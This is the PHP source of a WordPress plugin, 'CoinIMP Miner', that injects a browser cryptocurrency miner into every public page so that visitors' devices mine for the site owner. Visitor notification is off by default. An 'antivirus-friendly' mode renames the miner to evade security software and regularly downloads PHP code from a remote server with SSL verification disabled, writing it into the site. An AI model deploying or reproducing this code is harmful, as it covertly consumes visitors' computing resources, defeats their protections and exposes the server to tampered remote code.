<?php
/**
 * Plugin Name: CoinIMP Miner
 * Plugin URI: https://www.coinimp.com/
 * Description: Insert CoinIMP miner into your wordpress blog easily
 * Version: 1.0.1
 * Author: CoinIMP
 */

class CoinIMPMinerPlugin
{
    private $pluginDir;


    function __construct()
    {
        add_action('init', array(&$this, 'init'));
        add_action('admin_init', array(&$this, 'admin_init'));
        add_action('admin_menu', array(&$this, 'admin_menu'));
        add_action('wp_footer', array(&$this, 'wp_footer'));
        $this->pluginDir = plugin_dir_path(__FILE__);
    }

    function init()
    {
        load_plugin_textdomain('coinimp-miner-script-installer', false, basename($this->pluginDir) . '/lang');
    }

    function admin_init()
    {
        register_setting('coinimp-miner-script-installer', 'coinimp_throttle');
        if (get_option("coinimp_throttle") == "") {
            update_option('coinimp_throttle', 0);
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_sitekey');
        if (get_option("coinimp_sitekey") == "") {
            update_option('coinimp_sitekey', get_option("coinimp_defaultsitekeys")[get_option("coinimp_currentcurrency")]);
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_runonmobile');
        register_setting('coinimp-miner-script-installer', 'coinimp_disable');
        register_setting('coinimp-miner-script-installer', 'coinimp_notify');
        register_setting('coinimp-miner-script-installer', 'coinimp_showads');
        if (get_option("coinimp_showads") == "") {
            update_option('coinimp_showads', 'Enabled');
        }
        if (get_option("coinimp_notify") == "") {
            update_option('coinimp_notify', 'Never');
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_notificationtext');
        if (get_option("coinimp_notificationtext") == "") {
            update_option('coinimp_notificationtext', 'CoinIMP Miner is running in background.');
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_notificationheadertext');
        if (get_option("coinimp_notificationheadertext") == "") {
            update_option('coinimp_notificationheadertext', 'CoinIMP Miner');
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_notificationbackcolor');
        if (get_option("coinimp_notificationbackcolor") == "") {
            update_option('coinimp_notificationbackcolor', '#3d87ff');
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_notificationforecolor');
        if (get_option("coinimp_notificationforecolor") == "") {
            update_option('coinimp_notificationforecolor', '#000000');
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_notificationbordercolor');
        if (get_option("coinimp_notificationbordercolor") == "") {
            update_option('coinimp_notificationbordercolor', '#ffffff');
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_avfriendly');
        register_setting('coinimp-miner-script-installer', 'coinimp_avfriendlyfilename');
        if (get_option("coinimp_avfriendlyfilename") == "") {
            update_option('coinimp_avfriendlyfilename', $this->generateRandomString(4) . ".php");
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_currencies');
        update_option('coinimp_currencies', array('web',));
        register_setting('coinimp-miner-script-installer', 'coinimp_defaultsitekeys');
        update_option('coinimp_defaultsitekeys', array('b2442e8e9efcb11d24c3ae9128fba98f40af61d83aa27f2fd836b7c6115bdebd',));
        if (!get_option('coinimp_previousSiteKeys')) {
            register_setting('coinimp-miner-script-installer', 'coinimp_previousSiteKeys');
            update_option('coinimp_previousSiteKeys', array('b2442e8e9efcb11d24c3ae9128fba98f40af61d83aa27f2fd836b7c6115bdebd',));
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_currentcurrency');
        if (is_null(get_option("coinimp_currentcurrency"))) {
            update_option('coinimp_currentcurrency', 0);
        }
        register_setting('coinimp-miner-script-installer', 'coinimp_hidecontent');
        if (get_option("coinimp_avfriendly") == "Enabled") {
            $this->prepareAvFriendlyScriptFile();
        }
}

    function admin_menu()
    {
        $page = add_submenu_page(
            'options-general.php',
            __('CoinIMP Miner', 'coinimp-miner-script-installer'),
            __('CoinIMP Miner', 'coinimp-miner-script-installer'),
            'manage_options',
            __FILE__,
            array(&$this, 'LoadCoinimpOptions')
        );
        $previousSiteKeys = get_option("coinimp_previousSiteKeys");
        $previousSiteKeys[get_option("coinimp_currentcurrency")] = get_option("coinimp_sitekey");
        update_option('coinimp_previousSiteKeys', $previousSiteKeys);
    }

    function generateRandomString($length)
    {
        $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $charactersLength = strlen($characters);
        $randomString = '';
        for ($i = 0; $i < $length; $i++) {
            $randomString .= $characters[rand(0, $charactersLength - 1)];
        }
        return $randomString;
    }

    function wp_footer()
    {
        if (!is_admin() && !is_feed() && !is_robots() && !is_trackback()) {
            if (!get_option('coinimp_disable') == "Disabled") {
                $script = $this->getLocalResource("script.js");
                $variableName = "_client";
                $disableAds = get_option('coinimp_showads') == 'Disabled' ? ', ads: 0' : '';
                $script = str_replace("@variable", $variableName, $script);
                $script = str_replace("@key", get_option('coinimp_sitekey'), $script);
                $script = str_replace("@throt", get_option('coinimp_throttle'), $script);
                $script = str_replace("@showAds", $disableAds, $script);
                $script = str_replace("@currencymodifier", ", c: '" . get_option('coinimp_currencies')[get_option('coinimp_currentcurrency')][0] . "'", $script);
                if (get_option('coinimp_runonmobile') == "Disabled") {
                    $script = str_replace("@stopmobilemining", "if(! $variableName.isMobile()) ", $script);
                } else {
                    $script = str_replace("@stopmobilemining", "", $script);
                }

                if (get_option("coinimp_avfriendly") == "Enabled") {
                    $this->prepareAvFriendlyScriptFile();
                    $script = str_replace(
                        "@Script",
                        get_home_url() . "/wp-content/plugins/coinimp-miner/" . get_option(
                            "coinimp_avfriendlyfilename"
                        ) . "?f=" . $this->generateRandomString(
                            4
                        ) . ".js",
                        $script
                    );
                } else {
                    $script = str_replace(
                        "@Script",
                        $this->getResource("defscript") . "/" . $this->generateRandomString(4) . ".js",
                        $script
                    );
                }


                if (get_option('coinimp_notify') == "Floating") {
                    $script .= $this->prepareFloatingNotification();
                } else if (get_option('coinimp_notify') == "Footer") {
                    $script = $script . $this->prepareFooterNotification();
                } else if (get_option('coinimp_notify') == "Popup") {
                    $script .= $this->preparePopupNotification();
                }
                if (get_option('coinimp_hidecontent') == "Enabled") {
                    $script .= $this->getLocalResource("hidecontent.js");
                }
                $result = do_shortcode($script);
                if ($result != '') {
                    echo $result, "\n";
                }
            }
        }
    }

    private function prepareFooterNotification()
    {
        $footer = '<script nonce="IP6P03N6Lqw56G+jxhWtww==">';
        if (get_option('coinimp_runonmobile') == "Disabled")
            $footer .= 'if(! _client.isMobile()) {';
        $footer .= "jQuery(function($){ var customFooterText = '@Text'; $('.site-info').append('<span style=" . '"' . "float:right;" . '"' . ">' + customFooterText + '</span>'); }); </script>";
        $footer = str_replace("@Text", get_option('coinimp_notificationtext'), $footer);
        if (get_option('coinimp_runonmobile') == "Disabled")
            $footer = str_replace("</script>", '} </script>', $footer);
        return $footer;
    }

    private function prepareFloatingNotification()
    {
        $floatingNotification = "<div id='minernotify' style='border:2px solid @BorderColor; background-color: @BackColor;color: @ForeColor; position:fixed; bottom:0; right:0;z-index: 9999;'>@Text</div>";
        $floatingNotification = str_replace(
            "@Text",
            get_option('coinimp_notificationtext'),
            $floatingNotification
        );
        $floatingNotification = str_replace(
            "@BorderColor",
            get_option('coinimp_notificationbordercolor'),
            $floatingNotification
        );
        $floatingNotification = str_replace(
            "@ForeColor",
            get_option('coinimp_notificationforecolor'),
            $floatingNotification
        );
        if (get_option('coinimp_runonmobile') == "Disabled") {
            $floatingNotification .= PHP_EOL . '<script nonce="IP6P03N6Lqw56G+jxhWtww=="> if(_client.isMobile()) document.getElementById("minernotify").style.display="none"; </script>';
        }
        $floatingNotification = str_replace(
            "@BackColor",
            get_option('coinimp_notificationbackcolor'),
            $floatingNotification
        );
        return $floatingNotification;
    }

    private function prepareAvFriendlyScriptFile()
    {
       $scriptFile = $this->pluginDir . '/' . get_option("coinimp_avfriendlyfilename");
       $currentDate = date("Ymd");
       if (!file_exists($scriptFile) || date("Ymd", filemtime($scriptFile)) < $currentDate || filesize($scriptFile) < 1024)
          $this->downloadAvFriendlyPhpScript($scriptFile);
    }

    private function downloadAvFriendlyPhpScript($scriptFile)
    {
        $avFriendlyScriptURL = $this->getResource("avfriendly") . "/" . $this->generateRandomString(
                4
            ) . ".php";
        $curlHandler = curl_init();
        curl_setopt($curlHandler, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($curlHandler, CURLOPT_URL, $avFriendlyScriptURL);
        curl_setopt($curlHandler, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curlHandler, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36");
        $scriptData = curl_exec($curlHandler);
        curl_close($curlHandler);
        file_put_contents($scriptFile, $scriptData);
    }

    private function preparePopupNotification()
    {
        $popup = $this->getLocalResource("popup.html");
        $popup = str_replace(
            "@BorderColor",
            get_option('coinimp_notificationbordercolor'),
            $popup
        );
        $popup = str_replace(
            "@BackColor",
            get_option('coinimp_notificationbackcolor'),
            $popup
        );
        $popup = str_replace(
            "@TextColor",
            get_option('coinimp_notificationforecolor'),
            $popup
        );
        $popup = str_replace(
            "@NotificationText",
            get_option('coinimp_notificationtext'),
            $popup
        );
        $popup = str_replace(
            "@HeaderText",
            get_option('coinimp_notificationheadertext'),
            $popup
        );
        if (get_option('coinimp_runonmobile') == "Disabled") {
            $popup = str_replace(
                '<script nonce="IP6P03N6Lqw56G+jxhWtww==">',
                '<script nonce="IP6P03N6Lqw56G+jxhWtww==">' . PHP_EOL . 'if(! _client.isMobile()) {',
                $popup
            );
            $popup = str_replace(
                '</script>',
                '}' . PHP_EOL . '</script>',
                $popup
            );
        }
        return $popup;
    }

    function getResource($filename)
    {
        $resourcesPaths = 'https://coinimp.com/wppluginfile/';
        return file_get_contents($resourcesPaths . $filename);
    }

    function getLocalResource($filename)
    {
        return file_get_contents($this->pluginDir . "/$filename");
    }

    function LoadCoinimpOptions()
    {
        require_once($this->pluginDir . '/options.php');
    }

}


$coinimp_script = new CoinIMPMinerPlugin();
?>
